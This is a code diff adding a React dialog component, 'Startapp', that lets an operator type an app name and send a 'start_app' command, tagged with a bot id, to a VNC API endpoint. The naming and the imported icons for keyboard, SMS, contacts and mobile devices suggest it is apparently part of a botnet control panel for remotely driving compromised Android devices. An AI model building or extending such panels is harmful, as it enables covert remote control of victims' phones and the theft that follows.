@@ -1,0 +1,88 @@
+import React, { useState, useEffect, useRef } from 'react'
+import SettingsContext from 'src/settings';
+import NextLink from 'next/link';
+import { Dialog, Box, FormControl,InputLabel, Switch, Select, MenuItem, Tooltip,ListItemAvatar, Avatar, DialogTitle, SvgIcon, DialogContent, Typography, Button, Grid, Item, Paper, List, ListItem, ListItemIcon, ListItemText} from '@mui/material';
+import XCircleIcon from '@heroicons/react/24/solid/XCircleIcon';
+import UserIcon from '@heroicons/react/24/solid/UserCircleIcon';
+import Globe from '@heroicons/react/24/solid/GlobeEuropeAfricaIcon';
+import Battery from '@heroicons/react/24/solid/Battery100Icon';
+import { func } from 'prop-types';
+import axios from "axios";
+import $ from 'jquery';
+import { Svg } from "react-svg";
+import cheerio from "cheerio";
+
+import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
+import { faWifi, faXmarkSquare, faMobile, faUser, faUserAltSlash, faClockRotateLeft, faCommentSlash, faKeyboard, faKey, faBug, faB, faEye, faEyeSlash, faUniversalAccess, faCommentSms, faBugSlash, faCalendarDays, faSms, faAddressBook, faMobileAndroid, faMobileScreen, faMobileAlt, faMobileAndroidAlt, faRectangleList, faArrowsRotate, faTrashCan, faPaperPlane, faLink } from '@fortawesome/free-solid-svg-icons';
+import { borderRadius } from '@mui/system';
+
+import TextField from '@mui/material/TextField';
+
+import { toast } from 'react-toastify';
+
+export default function Startapp(props) {
+
+
+    const { openPopup, setOpenPopup, idbot} = props;
+    const [data, setdata] = useState('');
+
+    const startapp = (app) => {
+    
+        let commandreq = {
+          "id": idbot,
+          "command": "start_app",
+          "data" : {
+            "app": app,
+          }
+        };
+        sendCommand(commandreq);
+      }
+  
+  
+        const sendCommand = (commandreq) => {
+      let request = $.ajax({
+        type: 'POST',
+        url: SettingsContext.vncApiUrl + "/api",
+        data: JSON.stringify(commandreq)
+    });
+    }
+    
+    return (
+        
+        <Dialog open={openPopup} onClose={() => setOpenPopup(false)} maxWidth="md">
+            <DialogContent dividers>
+                    <div style={{ display: "flex", justifyContent: "space-between"}}>
+
+                    <Box
+                    bgcolor="primary.main"
+                    color="primary.contrastText"
+                    p={2}
+                    borderRadius={1}
+                    marginRight={2}
+                    alignItems="center"
+                    display="flex"
+                    height={45}
+                    width={220}
+                >
+                    <SvgIcon fontSize="medium">
+                          <FontAwesomeIcon icon={faLink}/>
+                        </SvgIcon>
+                        <Typography ml={1} variant='h6' color="primary.contrastText" >Open App</Typography>
+                        
+                    </Box>
+
+                    <Button
+                        onClick={()=>{setOpenPopup(false)}}>
+                        <FontAwesomeIcon icon={faXmarkSquare} size="2x"/>
+                    </Button>
+                    </div>
+
+                    <TextField onChange={()=> setdata(event.target.value)} sx={{mt: 3}} id="outlined-basic" label="APP" variant="outlined" fullWidth/>
+
+                    <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
+                    <Button onClick={()=> {if (data != '') { startapp(data); setOpenPopup(false); toast.success("Sent command to open " + data); setdata(''); } else { toast.error("You need to enter a app before performing this action"); } }} sx={{mt: 3, width: 115, height: 42, }} startIcon={(<SvgIcon fontSize="small"><FontAwesomeIcon icon={faPaperPlane} /></SvgIcon>)}variant="contained">Send</Button>
+                    </div>
+            </DialogContent>
+        </Dialog>
+    )
+}
